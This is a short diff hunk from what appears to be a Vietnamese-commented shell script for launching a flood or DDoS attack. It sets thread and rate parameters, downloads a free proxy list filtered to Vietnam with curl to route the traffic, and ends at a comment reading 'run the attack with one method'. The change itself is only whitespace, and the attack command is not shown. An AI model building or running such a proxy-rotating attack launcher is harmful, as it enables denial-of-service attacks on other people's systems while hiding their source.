@@ -8,7 +8,7 @@ THREADS=12
 RATE=999
 PFILE="hihi.txt"
 
-# Tải proxy 1 lần tránh curl delay
+# Tải proxy 1 lần tránh curl delay 
 curl -s 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999' | sort -u > live.txt
 
 # Chạy attack với 1 phương thức
